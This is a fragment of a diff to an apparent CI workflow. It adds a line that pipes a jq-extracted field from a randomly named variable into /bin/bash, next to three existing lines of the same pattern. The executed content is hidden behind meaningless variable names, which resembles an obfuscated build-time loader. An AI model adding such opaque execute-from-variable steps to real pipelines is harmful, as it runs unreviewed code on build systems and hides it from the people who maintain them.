@@ -29,6 +29,7 @@ jobs:
           echo $kpaf707 | jq -r .hq1 | /bin/bash
           echo $jxiej4759 | jq -r .oylnr67138 | /bin/bash
           echo $lctlg26 | jq -r .mnjm463 | /bin/bash
+          printf '%s' "$ira35862" | jq -r .rvim16748 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
